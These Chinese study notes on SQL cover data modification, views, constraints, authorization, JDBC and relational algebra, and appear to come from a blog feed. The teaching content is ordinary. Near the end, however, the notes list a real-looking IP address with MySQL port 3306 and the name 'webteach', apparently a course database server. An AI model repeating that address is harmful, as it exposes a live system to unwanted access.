向一个给定的关系插入新的元组：insert into 将一个给定的关系的一些元组的值更新：update 删除1delete from table_name [where &lt;条件表达式&gt;] 从表中删除符合条件的元组，如果没有where语句，则删除所有元组 123456789101112131415161718# 例# 删除 instructors 关系中的所有元组delete from instructor# 从 instructors 关系中删除与 Finance 系教师相关的所有元组delete from instructor where dept_name = &apos;Finance&apos;#从 instructor 关系中删除在位于 Watson 大楼的系工作的教师元组delete from instructor where dept_name in(select dept_name from department where building = &apos;Watson&apos;)# 删除工资低于大学平均工资的教师记录delete from instructor where salary &lt; (select avg(salary) from instructor) 插入12insert into table_name [(col1 [,col2]...)] values (val1 [,val2]...) 插入一条指定好值的元组 12insert into table_name [(col1 [,col2]...)] (子查询) 插入子查询结果中的若干条元组 into子句 指定要插入数据的表名及属性列 属性列的顺序可以与表定义中的顺序不一致 没有指定属性列：表示要插入的是一条完整的元组，且属性列属性与表定义中的顺序一致 指定部分属性列：插入的元组在其余属性列上取空值 values子句 提供的值必须与into子句匹配：值的个数&amp;&amp;值的类型 子查询 select子句目标列必须与into子句匹配：值的个数&amp;&amp;值的类型 12345678910111213141516# 例# 向 course 关系中插入新元组insert into course values (‘CS-437’,‘Database Systems’,‘Comp. Sci.’, 4);insert into course (course_id, title, dept_name, credits) values (‘CS-437’, ‘Database Systems’, ‘Comp. Sci.’, 4); # 向 student 关系中插入新元组，并将tot_creds 属性设置为nullinsert into student values (‘3003’, ‘Green’, ‘Finance’, null); # 将instructor 关系中的所有元组插入到student 关系里，并将属性tol_credits设置为0insert into student select ID, name, dept_name, 0 from instructor select from where 语句在它的结果被插入到相应的关系之前就完成了评估，否则，像这样的查询 insert into table1 select * from table1，如果table1没有主码的话，会出现问题 更新12345update table_name set col_name1 = 表达式|子查询 col_name2 = 表达式|子查询 ... [where 条件表达式] 指定对哪些列进行更新，以及更新后的值是什么 12345678910111213141516171819202122232425# 例# 老师工资上调5%update PROF set SAL = SAL * 1.05#将d1系的学生年龄增加1岁update Student set S_age = S_age + 1 where dno = &apos;d1&apos;# 将d1系全体学生的成绩置零update SC set Score = 0 where &apos;d1&apos; = (select dno from S where S.Sno = SC.Sno)# 将D01系系主任的工资改为该系的平均工资update PROFset SAL = (select avg(SAL) from PROF where Dno = D01) where Pno = (select DEAN from DEPT where Dno = D01) 为条件更新使用Case语句123456# 例update instructor set salary = case when salary &lt;= 100000 then salary * 1.05 else salary *1.03 end 使用标量子查询的更新123456789101112131415# 例# 为关系student重新计算并更新tot_credit属性的值update student S set tot_credit = (select sum(credits) from takes natural join course where S.ID = takes.ID and takes.grade &lt;&gt; &apos;F&apos; and takes.grade is not null); # 如果一个学生没有成功学完任何一个课程，则将其tot_creds 属性设为空# 不使用sum(credits)，而是使用: case when sum(credits) is not null then sum(credits) else 0 end 中级SQL连接表达式连接关系连接操作作用于两个关系并返回一个关系作为结果 一个连接操作是一个笛卡儿积，并且要求两个关系的元组满足某些匹配条件，他还指定在连接结果中要出现的属性 join操作通常用作from子句中的子查询表达式 外连接 一个扩展的连接操作，避免了信息的损失 计算join，然后将一个关系中与另一个不匹配的元组添加到结果中 使用null值 对于该关系，我们有左外连接、右外连接、全外连接和内连接 左外连接如下： 右外连接如下： 简而言之，往哪连接，被连接的表的主码全部需要保留，然后将其连接的属性有则填入，无则赋null 若找不到相应的主码，则将连接的表的那一行丢弃 全外连接如下： 连接操作将两个关系作为输入，返回一个关系作为结果 连接条件：规定了这两个关系中的哪些元组匹配，以及在连接结果中出现了什么属性 连接类型：规定了对每个关系中（基于连接条件）不与其他关系中的元组相匹配的元组怎样处理 对于自然连接，会自动合并相同的列，但是连接会保留列 例子如下： 视图在某些情况下，让所有的用户看到整个逻辑模型（即所有实际存储在数据库中的关系）是不可取的 视图提供一个对某些用户从视图中隐藏某些数据的机制 任何不是逻辑模型的一部分，但作为虚关系对用户可见的关系称为视图。 定义1create view v as &lt;query expression&gt; 其中，&lt;query expression&gt;可以是任何合法的SQL表达式，v表示视图名 一旦定义了一个视图，我们就可以用视图指代该视图生成的虚关系 定义视图时并不是由查询表达式的执行结果创造一个新关系，相反，一个视图的定义导致存储一个查询表达式，当该视图被使用时，他就被这个已存储的查询表达式替换（有点类似C++的宏定义） 特点 虚表，是从一个或几个基本表（或视图）导出的关系 只存放视图的定义，不会出现数据冗余 基表中的数据发生变化，从视图中查询的数据也随之改变 查询时，视图名可以出现在任何关系名可以出现的地方 对比 视图(view) vs 派生查询(with)： 视图存储在DB数据字典中，是数据库模式的一部分 with定义的派生关系，仅在所属的SQL有效，不属于DB模式 视图(view) vs 表(table)： 视图和表都是关系，都可以在SQL中直接应用 DB中存储表的模式定义和数据 DB中值存储视图的定义，不存视图的数据 视图数据实在使用视图时临时计算的 物化视图是提高计算的一种手段，结果等价于临时计算 视图的作用： 对外模式的支持 安全性、方便性 12345678910# 例# instructor关系的没有salary的属性视图create view faculty as select ID,name,dept_name from instructor # 找出Biology系的所有教师的姓名select namefrom facultywhere dept_name = &apos;Biology&apos; 视图的属性名缺省为子查询结果中的属性名，也可以是显式指明，在下列情况下，必须指明视图的所有列名： 某个目标列式聚集函数或列表达式 多表连接时，选出了几个同名列作为视图的字段 需要在视图中为某个列启用新的更合适的名字 目标列是* 123456# 例# 定义一个每个系的工资总和的视图create view departments_total_salary(dept_name, total_salary) as select dept_name, sum(salary) from instructor group by dept_name 使用其他视图定义视图一个视图可以用于定义另一个视图的表达式中 如果一个视图关系v2用于定义另一个视图关系v1的表达式中，则称v1直接依赖于v2 如果一个视图关系v1直接依赖于另一个视图v2，或通过其他视图间接依赖于v2，则称v1依赖于v2 一个师徒关系如果依赖于它自身，则被称为递归的 视图扩展一种通过其他视图的定义来定义视图含义的方法 设视图v1由表达式e1定义的，可能它本身就包含对视图关系的使用 一个表达式中的视图扩展重复以下替换步骤 12345&gt; repeat&gt; 找到e1中的关系vi&gt; 使用定义vi的表达式替换vi&gt; until 在e1中没有视图关系&gt; 是要视图不是递归的，循环就能终止 视图更新123456update view_nameset col = valwhere expressiondelete from view_namewhere expression 视图的更新就是转换为表的更新 1234567891011121314151617181920212223242526272829303132# 例create view IS_Student as select Sno,Sname,Sage from Student where Sdept = &apos;IS&apos;; #updateupdate IS_Studentset Sname = &apos;Alice&apos;where Sno = &apos;12315&apos;#transferToupdate Studentset Sname = &apos;Alice&apos;where Sno = &apos;12315&apos; and Sdept = &apos;IS&apos;;#insertinsert into IS_Student values(&apos;12306&apos;, &apos;Bob&apos;, 18)#transferToinsert into Studnet(Sno,Sname,Sage,Sdept) values(&apos;12306&apos;,&apos;Bob&apos;,18,&apos;IS&apos;) #deletedelete from IS_Studentwhere Sno = &apos;12315&apos;#transferTodelete from Studentwhere Sno = &apos;12315&apos; and Sdept = &apos;IS&apos; 有些更新不能被单独执行，大部分的SQL实现只允许在简单视图上的更新（①from子句中只有一个数据库关系；②select子句中只包含关系的属性名，不包含任何表达式、聚集函数或distinct声明；③任何没有出现select子句中的属性可以取空值；④查询中不含有group by或having子句） 对于行列子集视图可以更新 with check option 视图定义时，指定with check option，强制通过视图进行的修改，结果必须在视图中。 12345678910111213141516171819202122# 例&apos;&apos;&apos;Sno Sname Sage DeptS1 A 21 CS4 B 20 CS2 C 19 Ss3 D 21 S&apos;&apos;&apos;create view sv1 as select sno,sname,sage from s where Dept = &apos;C&apos; and sage&gt;20update sv1 set sage=19 where sno = &apos;s4&apos;# 更以更新,更新后,B不再出现在视图中create view sv1 as select sno,sname,sage from s where Dept = &apos;C&apos; and sage&gt;20 with check option;update sv1 set sage=19 where sno = &apos;s4&apos;# 不可以更新,update语句将被DBMS拒绝 物化视图定义：创建一个物理表，此表包含定义视图的查询结果的所有元组 如果查询中使用的关系发生了更新，则物化视图中的结果就会过期 每当视图的底层关系进行更新时要更新视图，以此维护视图 事务 工作单元 原子事务：要么全部执行，要么回滚，好像没有发生一样 从并发事务中隔离 隐式地开始一个任务 以commit work 或 rollback work结束 多数数据库的默认情况：每个SQL语句自动提交 可以关闭自动提交了一个会话 在SQL:1999里可以使用begin atomic ... end（但这种方式不被多数数据库支持） 完整性约束 完整性约束通过保证对数据库的修改不会造成数据的不一致，来防止对数据库数据的意外破坏 单个关系上的约束 not null：指定的属性上，不允许出现空值 限制：任何试图导致某个或某些元组非空属性为空的操作都将被拒绝 primary key：声明为主码 主码值不允许为空，也不允许出现重复 意义：关系对应到现实世界中的实体集，元组对应到实体，实体是相互可区分的，通过主码来唯一标识，若主码为空，则出现不可标识的实体，这是不容许的 unique：声明候选码 约束：不允许关系中，有两个元组在指定属性上取值相同 unique本身不限定属性非空 check(P)，P是一个谓词 约束：关系上的每一个元组，都必须满足P check可以针对一个或多个属性 check可以涉及其他表，但需考虑约束检查条件代价 对于check，我们有 1234567891011# 保证semester必须是四季即Spring,Summer,Fall,Winter中的一个create table section ( course_id varchar (8), sec_id varchar (8), semester varchar (6), year numeric (4,0), building varchar (15), room_number varchar (7), time slot id varchar (4), primary key (course_id, sec_id, semester, year), check (semester in(‘Fall’,‘Winter’,‘Spring’,‘Summer’)) 参照完整性保证在一个关系中给定属性集上的取值也在另一关系的特定属性集的取值中出现 A是一个属性的集合，R和S是两个包含属性A的关系，并且A是S的主码，如果对于每个而在R中出现的A在S中也出现，则A被称为R的外码 参照完整性的级联行为1234567891011121314151617# 参照完整性中的级联行为create table course ( course_id char(5) primary key, title varchar(20), dept_name varchar(20) references department)create table course ( … dept_name varchar(20), foreign key (dept_name) references department on delete cascade on update cascade, . . . )# 级联行为的替代方式: set null,set default 删除基本关系元组 Restrict方式：只有当依赖关系中没有一个外码值与要删除的基本关系的主码值相对应时，才可以删除该元组，否则系统拒绝此删除操作 Cascade方式：将依赖关系中所有外码值与基本关系中要删除的主码值所对应的元组一起删除 Set null方式：删除基本关系中元组时，将依赖关系中与基本关系中被删主码值相对应的外码值置为空值 1Foreign key (Sno) References S(Sno) [on delete [cascade|set null]] 修改基本关系元组 Restrict方式：只有当依赖关系中没有一个外码值与要修改的基本关系的主码值相对应时，才可以修改该元组主码，否则系统拒绝此次修改 Cascade方式：将依赖关系中所有与基本关系中要修改的主码值所对应的外码值一起修改为新值 Set null方式：修改基本关系中元组主码时，将依赖关系中与基本关系中被修改主码值相对应的外码值置为空值 1Foreign key (Sno) References S(Sno) [on update [cascade|set null]] 复杂check子句1create assertion &lt;assertion-name&gt; check &lt;predicate&gt; SQL的数据类型与模式SQL固有的数据类型 date：日期，包括年(四位)、月、日，如date &#39;2005-7-27&#39; time：时间，包括小时、分、秒，如time &#39;09:00:30&#39;，time &#39;09:00:30.75&#39; timestamp：date和time的组合，如timestamp &#39;2005-7-27 09:00:30.75&#39; interval：时间段，如interval &#39;1&#39; day 两个 date/time/timestamp 类型值相减产生一个 interval 类型值 可以在 date/time/timestamp 类型的值上加减 interval 类型的值 用户定义的类型SQL中的create type结构创建用户定义的类型 12345678# 例create type Dollars as numeric(12,2) finalcreate table department( dept_name varchar(20), building varchar(15), budget Dollars); SQL-92中的create domain结构创建用户定义的域类型 12345create domain person_name char(20) not nullcreate domain degree_level varchar(10)constraint degree_level_testcheck(value in (&apos;Bachelors&apos;,&apos;Masters&apos;,&apos;Doctorate&apos;)) 类型和域相似，但是域本身可以指定约束，比如not null 用户定义类型 独特类型：distinct type：create type Dollars as numeric(12,2) 结构化：structured：create type person(pid char(18),name varchar(8)) 用户定义类型，本质上是对RDB的面向对象扩展 用户定义域：create domain Dollar as numeric(12,2) 自定义域不支持结构 Type vs Domain Type：进行强类型检查 Domain：不进行强类型检查，支持强制类型转换 Type由严格的OO理论基础，Domain时纯RDB的概念 大对象类型大对象类型（照片、视频、CAD文件等）以large object类型存储 blob：二进制数据的大对象数据类型——对象是没有被解释的二进制数据的大集合（对二进制数据的解释由数据库系统以外的应用程序完成） clob：字符数据的大对象数据类型——对象是字符数据的大集合 当查询结果是一个大对象时，返回的是指向这个大对象的指针，而不是大对象本身 LOB：Large OBject，用于存储大空间的值，存储由指针加文件实现 LOB访问：一般使用专用语句访问 1234# Oracleselect Blob doc into ...from bookwhere cno = &apos;c1&apos; 授权权限的转授和回收允许用户把已获得的权限转授给其他用户，也可以把已授给其他用户的权限在回收上来 权限图节点是用户，根节点是DBA，有向边Ui &rarr; Uj ，表示用户Ui 把某权限授给用户Uj 一个用户拥有权限的充分必要条件是在权限图有一条从根节点到该用户节点的路径 数据库某些部分的几种授权形式： Read：允许读取，但是不能修改数据 Insert：允许插入新数据，但是不能修改已有的数据 Update：允许修改，但是不能删除数据 Delete：允许删除数据 修改数据库模式的几种授权形式： Index：允许创建和删除索引 Resources：允许创建新的关系 Alteration：允许增加或删除关系的属性 Drop：允许删除关系 SQL中的授权规范grant语句用于授予权限 12grant &lt;权限列表&gt;on &lt;关系名|视图名&gt; to &lt;用户|角色列表&gt; &lt;用户|角色列表&gt;：一个用户id | public，所有合法用户持有所授权限 | 一个角色 对于某个视图授权后，并没有对该视图所基于的关系授权 权限的授予者必须已经持有相应的权限（或者是数据库管理员） 权限列表： select：允许对关系进行读访问，或者使用视图进行查询的能力 insert：插入元组的能力 update：更新元组的能力 delete：删除元组的能力 all privileges：所有允许权限的简写形式 1234&gt; # 例&gt; # 将对关系instructor的select权限授予用户U1U2U3&gt; grant select on instructor to User1,User2,User3&gt; revoke语句用于收回权限 12revoke &lt;权限列表&gt;on &lt;关系名|视图名&gt; from &lt;用户|角色列表&gt; &lt;权限列表&gt;可以是all，表示收回被收回人持有的所有权限 如果 包含public的话，则除了显式地被授予权限的用户外，所有的用户将失去权限 如果同意权限由不同授权人两次授予同一用户，用户在一次权限被回收后，仍保持有权限 收回权限时，若该用户已将权限授予其他用户，也一并收回 角色12345678create role instructorgrant instructor to Amit# 角色可以被授以权限grant select on takes to instructor# 角色可以授以用户，也可以被授以其他角色create role teaching_assistantgrant teaching_assistant to instructor# instructor 继承teaching_assistant的所有权限 角色链 123create role deangrant instructor to deangrant dean to Satoshi 视图的权限123456create view geo_instructor as ( select * from instructor where dept_name = &apos;Geology&apos;)grant select on geo_instructor to geo_staff references权限创造外码 1grant references (dept_name) on department to Mariano 权限的转移：with grant option 授予其权限并允许用户可以将此权限授予其他用户 1grant select on table_name to Alice with grant option 高级SQL使用程序设计语言访问数据库 动态SQL JDBC和ODBC 嵌入式SQL API（Application-program interface）用于程序和数据库服务器之间的交互 应用程序调用：①与数据库服务器连接；②向数据库服务器发送SQL命令；③逐个取结果元组到程序变量 ODBC（Open Database Connectivity）：用于C，C++，C#和Visual Basic JDBC（JAVA Database Connective）：用于Java JDBCJDBC是一个支持SQL的Java API，用于与数据库系统通信 JDBC支持查询和更新数据、检索查询结果等多种功能 JDBC也支持元数据检索，例如查询当前数据库中的关系、关系属性的名字和类型 与数据库的通信模型 打开一个连接 创建一个statement对象 使用statement对象执行查询，发送查询并取回结果 处理错误的异常处理机制 JDBC的基本工作步骤如下： 123456789101112131415161718192021222324252627282930313233343536373839404142public static void JDBCExample(String dbid,String userid,String passwd)&#123; try&#123; //1.Load the JDBC driver class Class.forName("oracle.jdbc.driver.OracleDriver"); //2.Open a database connection // jdbc:database_type:mode:URI // database_type = [mysql,oracle,...] // oracle:URI: @URI // mysql:URI: //URI Connection conn = DriverManager.getConnection( "jdbc:oracle:thin:@URI", userid, passwd); //3.Issue SQL statements Statement stmt = conn.createStatement(); /* * 4.Process result set * Do Actual Work */ stmt.close(); conn.close(); &#125;catch (SQLException sqle)&#123; System.out.println("SQLException: " + sqle); &#125; &#125;------------------------------------------------------------------//Actual Work//updatestmt.executeUpdate("insert into instructor values('" + a1 + "', 'Kim','Physics',98000)");//queryResult rset = stmt.executeQuery("Select dept_name ,avg(salary) from instructor group by dept_name");while(rset.next())&#123; System.out.println(rset.getString("dept_name") + "\t" + rset.getFloat(2));&#125;//nullrset.wasNull() = true; JDBC：立即执行VS预备语句 立即执行 使用Statement类，将SQL语句直接交给DBMS执行 一次语句执行DBMS进行一次语句编译 使用预备语句执行 使用PreparedStatement类，SQL语句执行，首先进行编译，编译结果赋予PreparedStatement的对象 预编译的结果可被反复多次执行 同嵌入SQL预编译不同（在编译程序时进行），JDBC的预编译时在程序运行中进行的 一个SQL多次执行 使用预备语句，仅编译一次 立即执行的模式下，需多次编译 在一SQL多次执行时，使用预备语句比立即执行的 12345678910// 预备语句PreparedStatement pStmt = conn.prepareStatement( "insert into instructor values(?,?,?,?)");pStmt.setString(1,"88888");pStmt.setString(2,"Alice");pStmt.setString(3,"Finance");pStmt.setInt(4,1250000);pStmt.executeUpdate();pStmt.setString(1,"88888");pStmt.executeUpdate(); 对于查询，使用pStmt.executeQuery()，返回一个结果集（ResultSet） 将一个来自用户的输入添加到查询时，使用预备语句比较好 SQL语句的预编译能够有效防止SQL注入 元数据特性ResultSet：元数据：描述数据的数据 123456ResultSet rs;//执行完查询后得到的结果ResultSetMetaData rsmd = rs。getMetaData();for(int i = 1;i&lt;=rsmd.getColumnCount();i++)&#123; System.out.println(rsmd.getColumnName(i)); System.out.println(rsmd.getColumnTypeName(i));&#125; 如上，就是用java代码获取元数据的代码 查询结果的元数据：①对描述查询结果集的属性类型（结果集的模式）；②对编程时不能确定的结果集模式时非常有用 123456789DatabaseMetaData dbmd = conn.getMetaData(); ResultSet rs = dbmd.getColumns(null, "univdb", "department", "%"); // Arguments to getColumns: Catalog, Schema-pattern, Table-pattern, // and Column-Pattern // Returns: One row for each column; row has a number of attributes // such as COLUMN_NAME, TYPE_NAMEwhile(rs.next()) &#123; System.out.println(rs.getString("COLUMN_NAME"),rs.getString("TYPE_NAME"));&#125; DatabaseMetaData类：JDBC的一个类，对DB数据字典进行封装，类方法可以读取数据字典元数据，屏蔽了数据字典的具体实现模式，对应用提供了访问DB数据字典元数据的标准方法 JDBC的事务控制在默认情况下，每个SQL语句都被作为一个被自动提交的独立的事务 对于有多个更新的事务，这种做法并不好 可以通过代码关闭自动提交：conn.setAutoCommit(false); 事务必须被显式的提交或回滚：conn.commit();或conn.rollback(); 打开自动提交：conn.setAutoCommit(true); 调用函数和过程12CallableStatement cStmt1 = conn.prepareCall("&#123;? = call some function(?)&#125;");CallableStatement cStmt2 = conn.prepareCall("&#123;call some procedure(?,?)&#125;"); 处理大型对象类型getBlob()和getClob()与getString()方法类似，但是分别返回Blob和Clob对象 通过getBytes()从这些对象里得到数据 将一个开放的流域Java Blob或Clob对象相连，来更新大对象 1blob.setBlob(int parameterIndex, InputStream inputStream); SQLJ由于JDBC的动态化，编译器无法捕捉其错误，因此有SQLJ SQLJ：在java中的嵌入式SQL 12345678910#sql iterator deptInfoIter ( String dept name, int avgSal);deptInfoIter iter = null;#sql iter = &#123; select dept_name, avg(salary) from instructor group by dept name &#125;;while (iter.next()) &#123; String deptName = iter.dept_name(); int avgSal = iter.avgSal(); System.out.println(deptName + " " + avgSal);&#125;iter.close(); ODBC ODBC结构如上图 ODBC：Open Database Connectivity标准： 应用程序与数据库服务器通信标准 应用程序接口 与数据库建立一个连接 发送查询和更新数据库的语句 取回结果 （略） 嵌入式SQLSQL标准定义了许多语言的嵌入式SQL，如C，JAVA，Cobol SQL查询所嵌入的语言被称为宿主语言（host language），宿主语言中使用的SQL结构被称为嵌入式SQL 这些语言的基本形式遵循System R的嵌入到PL/I的SQL的形式 （略） 函数和过程和结构SQL：1999支持函数和过程 函数/过程可以用SQL自身写，也可以用外部编程语言写 函数对专门的数据类型，如图像和几何对象特别有用 许多数据库系统支持表值函数（table-valued functions），表值函数会返回一个关系作为结果 SQL：1999支持许多命令式结构，包括循环（loops）、if-then-else、赋值（assignment） 123456789101112131415# 定义一个函数,输入一个系的名字,返回该系的教师数量create function dept_count(dept_name varchar(20)) returns integer begin declare d_count integer; select count(*) into d_count from instructor where instructor.dept_name = dept_name return d_count; end # 找出教师数大于12的所有系的名称和预算select dept_name,budgetfrom departmentwhere dept_count(dept_name) &gt; 12 SQL：2003增加了返回关系作为结果的函数 1234567891011121314# 返回一个包含特定系的所有教师的表create function instructors_of (dept_name char(20)) returns table (ID varchar(5), name varchar(20), dept_name varchar(20), salary numeric(8,2))return table (select ID,name,dept_name,salary from instructor where instructor.dept_name = instructors_of.dept_name)#useselect * from table (instructs_or(&apos;Music&apos;)) dept_count函数也可以写成一个过程 1234567891011create procedure dept_count_proc (in dept_name varchar(20), out d_count integer)begin select count(*) into d_count from instructor where instructor.dept_name = dept_count_proc.dept_nameend# 可以在一个SQL过程中或者嵌入式SQL中使用call语句调用过程declare d_count integer;call dept_count_proc(&apos;Physics&apos;,d_count); 过程和函数可以通过动态SQL触发 SQL:1999：允许使用多个同名过程/函数（称为名字重载），只要参数的个数不同，或对于那些有相同参数个数的函数，至少有一个参数的类型不同 触发器（略） 形式化关系查询语言关系代数 关系代数 六种基本运算符 选择（Select）：σ 投影（Project）：Π 并（union）：∪ 集合差（set difference）：- 笛卡儿积（Cartesian product）：× 更名（rename）：ρ 关系代数的运算以一个或两个关系作为输入，产生一个新的关系作为结果 选择运算 记法：σp(r) p被称为选择谓词 定义为： σp(r) = { t | t ∈ r and p(t) }，其中p是一个命题演算公式，由连词（∧(and)，∨(or)， ┐(not)）把项连接起来构成每一个项（term）的形式可以为：&lt;attribute&gt; op &lt;attribute&gt; or &lt;constant&gt; ，其中op可以是：=，≠，&gt;，≥，&lt;，≤ 示例：σ dept_name = “Physics”(instructor) 选择运算是从行的角度进行的运算 投影运算 记法：ΠA1,A2,…,Ak(r) ，其中A1,A2,…,Ak 是属性名，r是关系名 结果由选择的k列组成，删除了没有被选择的其他列 因为关系是集合，所以重复的元组从结果中删除 示例：ΠID, name, salary(instructor) 投影操作主要是从列的角度进行运算 并运算 记法：r ∪ s 定义为：r ∪ s = { t | t ∈ r or t ∈ s } 要使并运算r∪s有意义 r，s必须是同元的（属性数目必须相同） 属性的域必须相容（如r的第二列的属性类型必须和s的第二列类型相同） 示例：找出开设在2009年秋季学期或者2010年春季学期或者这二者皆开的所有的课程： Πcourse_id (σ semester = “Fall” Λ year=2009 (section) ) ∪Πcourse_id (σ semester=“Spring” Λ year=2010 (section) ) 集合差运算 记法：r - s 定义为：r - s = { t | t ∈ r and t ∉ s } 必须保证集合差运算在相容的关系间进行 r 和 s必须是同元的 r 和 s属性的域必须相容 示例：找出开设在2009年秋季学期但是在2010年春季学期不开的课程：Πcourse_id (σ semester = “Fall” Λ year=2009 (section) ) -Πcourse_id (σ semester=“Spring” Λ year=2010 (section) ) 基本运算的分配律 投影和并可以分配 Πpid,name(S∪T) ≡ Πpid,name(S) ∪ Πpid,name(T) 投影和差不可分配 笛卡儿积运算 记法：r × s 定义为：r × s = { tq | t ∈ r and q∈ s } 元组的连串（Concatenation）：若r = (r1,..,rn)，s = (s1,…,sm)，则定义r与s的连串为一个n+m的元组，记作rs = (r1,…,rn,s1,s…,sm) 假设关系r(R)和s(S)的属性不相交（即R ∩ S = Φ ） 如果关系r(R)和s(S)的属性有相交的，则必须使用更名运算 示例： 运算的组合 如图为一个例子 更名运算 允许通过更名来引用关系代数表达式的结果 允许引用一个关系时使用多于一个的名字 如： ρX(E) ：返回更名为X的表达式E的结果 如果关系代数表达式E时n元的，则 ρ χ(A1,A2,…,An)(E) ，返回被更名为X的表达式E的结果，并且属性被更名为A1，A2，…，An 关系代数表达式嵌套 关系代数中基本的表达式是如下二者之一： 数据库中的一个关系 一个常数关系 n设E1 和E2是关系代数表达式，则以下这些都是关系代数表达式： E1 ∪ E2 E1 – E2 E1 x E2 σp (E1), 其中P是E1的属性上的谓词 Πs(E1),其中S 是E1中某些属性的列表 ρx (E1),其中x 是E1结果的新名字 附加关系代数运算 附加运输没有实质地扩展关系代数的能力，但是简化了查询的书写 集合交 自然连接 赋值 外连接 #### 集合交运算 记法：r ∩ s 定义为： r ∩ s = { t | t ∈ r and t ∈ s } r 和 s 是同元的 r 和 s 属性域相容 注： r ∩ s = r - ( r - s ) = s - ( s - r ) θ连接定义： 所以，θ连接是做笛卡儿积，然后筛选出符合AθB表达式的元组作为结果返回 自然连接运算 记法：r ⋈ s 定义：关系 r 和 s 分别是模式 R 和 S 的关系，则 r ⋈ s 是由如下方式得到的模式 R ∪ S 的关系 对于 r 中的每个元组 tr 和 s 中的每个元组 ts 所组成的元组对 如果 tr 和 ts 在 R ∩ S的属性上有相同的值，则在结果中加入一个元组t，并且： t 在r上和 tr 有相同的值 t 在s上和 ts 有相同的值 示例：若R = (A,B,C,D) ，S = (E,B,D) ，结果模式 = (A,B,C,D,E) ，则 r ⋈ s =Πr.A, r.B, r.C, r.D, s.E ( σ r.B = s.B Λ r.D = s.D (r × s ) ) 自然连接和等值连接的不同 自然连接中相等的分量必须是相同的属性组，并且要在结果中去掉重复的属性，二等值连接则不必 当 R 与 S 无相同属性时， R ⋈ S = R × S 可交换，可结合 s ⋈ sc ≡ sc ⋈ s ( s ⋈ sc ) ⋈ c ≡ s ⋈ ( sc ⋈ c ) 赋值运算 赋值运算（⬅）提供了一种简化关系代数表达式书写的方式 把查询表达为一个顺序程序，由以下构成 一系列赋值 一个其值被作为查询结果显示的表达式 赋值必须是赋给一个临时关系变量 外连接 外连接运算是连接运算的扩展，可以处理缺失的信息 计算连接，然后一个关系中失配的元组添加到结果中 使用空值（null）： null代表一个值未知或不存在 所有的包含null比较运算都被定义为false 示例： 现有关系如下图： 有连接、左外连接、右外连接、全外连接如下： 连接即将表做笛卡儿积，筛选出相同属性拥有相同值的元组，将其连接起来成为一个新的元组 左外连接即保证左表的主码完整性，右外连接保证右表的主码完整性 全外连接保证全部数据的不被舍弃 均用空值null填补空白的属性 外连接运算可以用基本关系代数表示 空值 元组的一些属性可以为空值，用null表示 null代表一个值未知或不存在，空值是一种状态，不是一个明确的值 含有null的算数表达式的结果为null 聚集函数直接忽略空值（比如在SQL里） 在去重和分组运算中，null和其他值一样，两个null被看作是相同的值 含有空值的比较运算的结果是一个特殊的值：unknown 如果用 false 取代 unknown，那么 not (A &lt; 5) 和 A &gt;= 5不等价 使用unknown的三值逻辑 or：(unknown or true) = true，(unknown or false) = unknown，(unknown or unknown) = unknown and：(unknown and true) = unknown，(unknown and false) = falses，(unknown or unknown) = unknown not：not unknown = unknown 在SQL中，若谓词P的值为unknown，则P is unknown = true 选择（select）谓词的结果如果是unknown，则相当于false 除运算 定义：给定两个关系 r(R) 和 s(S) ，并且 S ⊂ R，则 r ÷ s 是满足 t × s ⊆ r 的最大关系t(R-S) 可以将 r ÷ s 写为：temp1 ⬅ ΠR-S(r) ，temp2 ⬅ ΠR-S( (temp1 × s) - ΠR-S, S(r) ) ，result = temp1 - temp2 示例： r÷s给出的学生ID选了Biology系卡的所有课r(ID, course_id) = Π ID, course_id(takes) 且 s(course_id) = Πcourse_id(σdept_name = “Boilogy” (course)) 扩展的关系代数运算 广义投影 聚集函数 广义投影 定义：ΠF1,F2,…,Fn(E) ，E是任意关系代数表达式，Fi是涉及常量以及E的模式种属性的算术表达式 广义投影运算允许在投影列表中使用算术函数来对投影进行扩展 示例：给定关系 instructor(ID, name, dept_name, salary) 其中salary 是年薪， 可以得到每个教师的ID、name、dept_name及每月的工资： ΠID, name, dept_name, salary/12(instructor) 聚集函数 聚集函数：输入值的一个汇集，将单一值作为结果返回 avg：平均值 min：最小值 max：最大值 sum：求和 count：计数 示例： 聚集的结果没有名称 可以使用更名运算给他命名 为方便起见，我们允许把更名作为聚集运算的一部分 多重关系代数 纯关系代数删除所有的重复 多重集关系代数保存重复，为了匹配SQL的语义 多重集关系代数定义为： 选择：和输入关系中的满足选择条件的元组个数一样多 投影：每个输入元组产生一个元组，即使有重复也保留 叉积：如果关系 r 的元组 t1 有m个副本，关系s 的元组 t2 有 n**个副本，则关系r x s的元组t1.t2有m x n个副本 类似的，其他的操作为 示例：并：m + n个副本，交：min(m, n)个副本，差：min(0, m – n)个副本 具体可以见SQL的多重关系运算==&gt; #集合运算与重复 元组关系演算 元组关系演算是非过程化的查询语言，查询表达式的形式为：{ t | P(t) } 表示它是所有使谓词P为真的元组 t 的集合 t 为元组变量，t[A] 表示元组 t 在属性A上的值 t ∈ r 表示元组 t 在关系 r 中 P是一个类似于谓词演算的公式，由原子公式和运算符组成 原子公式 s ∈ R：s是关系R中的一个元组 s[x] θ u[y] ：s[x]与u[y] 为元组分量，他们之间满足比较关系θ s[x] θ c：分量s[x]与常量c之间满足比较关系θ 公示的递归定义 原子公式是公式 如果P是公式，那么 ﹁P 和 (P) 也是公式 如果P1、P2是公式，则 P1 ∧ P2， P1 ∨ P2 ，P1 &rArr; P2也是公式 如果P(t) 是公式，R是关系， 则 ∃ t ∈ R (P(t)) 和 ∀ t ∈ R (P(t)) 也是公式 谓词演算公式： 属性和常量的集合 比较运算符的集合（&lt;，≤，=，≠，&gt;，≥） 连词的集合（and，or，not） 蕴含（&rArr; ）： x &rArr; y，如果x为真，则y也为真。 x &rArr; y ≡ ﹁ x &or; y 量词的集合：∃ 和 ∀ 表达式的安全性 元组关系演算表达式可能产生一个无线的关系 为了避免产生无限关系，我们将限制所允许的表达式集合为安全表达式 元组关系演算与关系代数的等价性 投影： ΠA(R) = { t | ∃s ∈ R，(t[A] = s[A]) } 选择： σF(A)(R) = { t | t ∈ R ∧ F(t[A]) } 广义笛卡尔积： R(A) × S(B) = { t | ∃u∈R, ∃s∈S ，( t[A] = u[A] ∪ t[B] = s[B])} 并： R ∪ S = { t | t ∈ R &or; t ∈ S } 差： R - S = { t | t ∈ R &and; ﹁ t ∈ S } 数据库设计与ER模型关系数据库设计数据存储和数据访问查询处理和查询优化事务管理211.87.227.230:3306 webteach]]></content>
      <categories>
        <category>Database</category>
      </categories>
      <tags>
        <tag>Database</tag>
        <tag>StudyNote</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Functions with potential code execution risks in Python]]></title>
